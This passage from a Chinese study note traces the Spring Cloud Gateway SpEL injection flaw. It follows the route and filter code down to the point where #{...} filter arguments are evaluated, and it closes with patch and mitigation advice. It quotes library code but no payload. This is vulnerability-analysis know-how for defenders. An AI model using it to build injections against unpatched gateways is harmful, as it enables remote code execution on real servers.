![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2044.png)

而`bind`方法被五处地方所引用：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2045.png)

本次主要关注`loadGatewayFilters`方法，也就是上面的第三个。`loadGatewayFilters`方法继续向前路径为：`loadGatewayFilters() -> getFilters() -> convertToRoute() -> getRoutes()`：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2046.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2047.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2048.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2049.png)

整体利用链为：

```java
getValue:273, Spelexpression (org.springframework.expression.spel.standard)

getValue:60, ShortcutConfigurable (org.springframework.cloud.gateway.support)

normalize:94, ShortcutConfigurable$ShortcutType$1 (org.springframework.cloud.gateway.support)

normalizeProperties:140, ConfigurationService$ConfigurableBuilder (org.springframework.cloud.gateway.support)

bind:241, ConfigurationService$AbstractBuilder (org.springframework.cloud.gateway.support)

loadGatewayFilters:144, RouteDefinitionRouteLocator (org.springframework.cloud.gateway.route)

getFilters:176, RouteDefinitionRouteLocator (org.springframework.cloud.gateway.route)

convertToRoute:117, RouteDefinitionRouteLocator (org.springframework.cloud.gateway.route)
...
```

1. 漏洞实现分析

首先`getRoutes()`调用`convertToRoute`方法并把参数`routeDefinition`传入，`routeDefinition`参数就是自定义的路由，而`RouteDefinition`的内容就是路由的语法格式。

相关代码：

```java
private Route convertToRoute(RouteDefinition routeDefinition) {
		AsyncPredicate<ServerWebExchange> predicate = combinePredicates(routeDefinition);
		List<GatewayFilter> gatewayFilters = getFilters(routeDefinition);

		return Route.async(routeDefinition).asyncPredicate(predicate).replaceFilters(gatewayFilters).build();
	}
```

```java
public Flux<Route> getRoutes() {
		Flux<Route> routes = this.routeDefinitionLocator.getRouteDefinitions().map(this::convertToRoute);

		if (!gatewayProperties.isFailOnRouteDefinitionError()) {
			// instead of letting error bubble up, continue
			routes = routes.onErrorContinue((error, obj) -> {
				if (logger.isWarnEnabled()) {
					logger.warn("RouteDefinition id " + ((RouteDefinition) obj).getId()
							+ " will be ignored. Definition has invalid configs, " + error.getMessage());
				}
			});
		}
```

根据`spring-cloud-gateway-3.0.5\spring-cloud-gateway-server\src\main\java\org\springframework\cloud\gateway\route`的`RouteDefinition.java`，我们可以从`toString`方法看到数据字段的情况，而且从上文的代码中`filters`字段是要求是`ArrayList`类型。

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2050.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2051.png)

之后定义了一个`List<GatewayFilter>`类型的`gatewayFilters`变量，其中`GatewayFilter`继承`ShortcutConfigurable`接口：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2052.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2053.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2054.png)

之后调用`getFilters`方法并且传入自定义路由：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2055.png)

我们在回看这段代码：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2056.png)

```java
private List<GatewayFilter> getFilters(RouteDefinition routeDefinition) {
		List<GatewayFilter> filters = new ArrayList<>();

		// TODO: support option to apply defaults after route specific filters?
		if (!this.gatewayProperties.getDefaultFilters().isEmpty()) {
			filters.addAll(loadGatewayFilters(routeDefinition.getId(),
					new ArrayList<>(this.gatewayProperties.getDefaultFilters())));
		}

		if (!routeDefinition.getFilters().isEmpty()) {
			filters.addAll(loadGatewayFilters(routeDefinition.getId(), new ArrayList<>(routeDefinition.getFilters())));
		}

		AnnotationAwareOrderComparator.sort(filters);
		return filters;
	}
```

首先判断是否有默认的`filters`，系统默认会有，所以`(!this.gatewayProperties.getDefaultFilters().isEmpty())`返回`true`，调用`loadGatewayFilters`设置默认的`filters`，`(!routeDefinition.getFilters().isEmpty())`结果也是`true`，调用`loadGatewayFilters`方法传入`id`以及`filters`数组。

传入到`loadGatewayFilters`方法后`filters`就成为了`filterDefinitions`，首先获取`filterDefinitions`的大小，然后开启循环，将`filterDefinitions`中的数据放入`definition`，获取`definition.getName`放入`factory`，然后判断`factory`是否是`null`，如果是就抛出异常，提示`"Unable to find GatewayFilterFactory with name {filter}"`，不是的话判断`logger`是否已开始`debug`模式，然后打印日志`"RouteDefinition {id} applying filter {args} to {filter}”`，具体部分代码如下：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2057.png)

```java
List<GatewayFilter> loadGatewayFilters(String id, List<FilterDefinition> filterDefinitions) {
		ArrayList<GatewayFilter> ordered = new ArrayList<>(filterDefinitions.size());
		for (int i = 0; i < filterDefinitions.size(); i++) {
			FilterDefinition definition = filterDefinitions.get(i);
			GatewayFilterFactory factory = this.gatewayFilterFactories.get(definition.getName());
			if (factory == null) {
				throw new IllegalArgumentException(
						"Unable to find GatewayFilterFactory with name " + definition.getName());
			}
			if (logger.isDebugEnabled()) {
				logger.debug("RouteDefinition " + id + " applying filter " + definition.getArgs() + " to "
						+ definition.getName());
			}
```

定义变量`configuration`，通过加载`definition`参数，也就是传入的自定义路由，创建配置服务然后调用`bind`方法，具体部分代码如下：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2058.png)

```java
// @formatter:off
			Object configuration = this.configurationService.with(factory)
					.name(definition.getName())
					.properties(definition.getArgs())
					.eventFunction((bound, properties) -> new FilterArgsEvent(
							// TODO: why explicit cast needed or java compile fails
							RouteDefinitionRouteLocator.this, id, (Map<String, Object>) properties))
					.bind();
```

`bind`方法处主要是一些判断以及提示，判断`configurationService`的一些内容字段，比如`configurable`是否为`null`，`name`等是否为`null`以及是否是空白等，`(this.normalizedProperties == null)`为`true`，调用`normalizeProperties`方法，具体部分代码如下：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2059.png)

```java
public T bind() {
			validate();
			Assert.hasText(this.name, "name may not be empty");
			Assert.isTrue(this.properties != null || this.normalizedProperties != null,
					"properties and normalizedProperties both may not be null");

			if (this.normalizedProperties == null) {
				this.normalizedProperties = normalizeProperties();
			}
...
		}
```

`(this.service.beanFactory != null)`为`true`，调用`normalize`方法传入若干参数（注意打开`overide`）：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2060.png)

```java
@Override
		protected Map<String, Object> normalizeProperties() {
			if (this.service.beanFactory != null) {
				return this.configurable.shortcutType().normalize(this.properties, this.configurable,
						this.service.parser, this.service.beanFactory);
			}
			return super.normalizeProperties();
		}
```

以`args`作为参数开启循环，`args`是`Map<String, String>`类型，然后取出`key`与`value`，其中`key`要求不能是`"*genkey*"`开头，否则就报错`"Must not instantiate utility class."`以及其他几个并列要求，然后调用`getValue`方法：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2061.png)

```java
enum ShortcutType {

		DEFAULT {
			@Override
			public Map<String, Object> normalize(Map<String, String> args, ShortcutConfigurable shortcutConf,
					SpelExpressionParser parser, BeanFactory beanFactory) {
				Map<String, Object> map = new HashMap<>();
				int entryIdx = 0;
				for (Map.Entry<String, String> entry : args.entrySet()) {
					String key = normalizeKey(entry.getKey(), entryIdx, shortcutConf, args);
					Object value = getValue(parser, beanFactory, entry.getValue());

					map.put(key, value);
					entryIdx++;
				}
				return map;
			}
		},
```

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2062.png)

```java
public interface ShortcutConfigurable {

   static String normalizeKey(String key, int entryIdx, ShortcutConfigurable argHints, Map<String, String> args) {
      // RoutePredicateFactory has name hints and this has a fake key name
      // replace with the matching key hint
      if (key.startsWith(NameUtils.GENERATED_NAME_PREFIX) && !argHints.shortcutFieldOrder().isEmpty()
            && entryIdx < args.size() && entryIdx < argHints.shortcutFieldOrder().size()) {
         key = argHints.shortcutFieldOrder().get(entryIdx);
      }
      return key;
   }
}
```

将`entryValue`赋值给`rawValue`，`entryValue`中的数据就是要执行的恶意代码，调用`trim`去除前后空格，判断`rawValue`是否为`null`以及是否"`#{`"开头和"`}`"结尾，设置`context`变量，将`beanFactory`放入`context.BeanResolver`：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2063.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2064.png)

相关部分代码：

```java
static Object getValue(SpelExpressionParser parser, BeanFactory beanFactory, String entryValue) {
		Object value;
		String rawValue = entryValue;
		if (rawValue != null) {
			rawValue = rawValue.trim();
		}
		if (rawValue != null && rawValue.startsWith("#{") && entryValue.endsWith("}")) {
			// assume it's spel
			StandardEvaluationContext context = new StandardEvaluationContext();
			context.setBeanResolver(new BeanFactoryResolver(beanFactory));
			Expression expression = parser.parseExpression(entryValue, new TemplateParserContext());
			value = expression.getValue(context);
		}
		else {
			value = entryValue;
		}
		return value;
	}
```

调用`parseexpression`方法，对字符串做处理，最终把恶意字符串开头的"`#{`"和结尾的"`}`"去掉

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2065.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2066.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2067.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2068.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2069.png)

`expression`调用`getValue`方法，进入`SpelExpression.class`，判断`context`是否为空，获取`compiledAst`赋值给`compiledAst`其值为`null`，`if`语句为假不会进入逻辑，调用`expressionState`方法，设置`rootobject`。

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2070.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2071.png)

再次调用`getValue`方法，得到结果：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2072.png)

**修复建议：**

1. 3.1.x升级到3.1.1+
2. 3.0.x升级到3.0.7+
3. 不需要`Gateway actuator endpoint`的话可以`management.endpoint.gateway.enabled: false`禁用它，或者在[https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security)设置保护措施